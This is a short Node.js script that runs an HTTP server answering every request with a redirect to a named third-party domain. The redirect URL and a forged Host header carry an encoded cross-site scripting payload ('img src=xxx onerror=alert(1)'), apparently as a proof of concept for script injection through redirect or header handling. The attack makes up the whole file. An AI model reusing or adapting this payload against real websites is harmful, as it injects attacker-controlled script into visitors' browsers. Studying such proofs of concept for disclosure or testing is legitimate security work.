const http = require('http');
http.createServer((req, res) => {
    res.writeHead(302, {'Location': "http://data.luxuryretreats.com/%2f%3f\'%22><img src=xxx onerror=alert(1)><!--", 'Host':"xxx/%2f%3f\'%22><img src=xxx onerror=alert(1)><!--"});
  res.end();
}).listen(80, () => console.log('Server http://localhost:80'));
